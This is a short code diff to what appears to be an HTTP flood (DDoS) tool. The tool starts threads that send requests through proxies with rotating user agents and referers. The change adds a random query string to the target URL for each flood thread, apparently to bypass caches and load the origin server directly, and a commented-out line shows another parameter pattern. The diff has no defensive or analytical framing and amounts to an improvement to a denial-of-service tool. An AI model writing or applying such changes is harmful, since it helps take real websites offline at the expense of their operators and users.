@@ -1748,8 +1748,10 @@ if __name__ == '__main__':
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
-                    HttpFlood(thread_id, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                    url_str = f"{str(url)}?{random_string(20)}"
+                    # url_str = f"{str(url)}?sportType=2&type=1&{random_string(10)}=1"
+                    HttpFlood(thread_id, URL(url_str), host, method, rpc, event, uagents, referers, proxies).start()
+                    url_str = None
 
             if method in Methods.LAYER4_METHODS:
                 target = URL(urlraw)
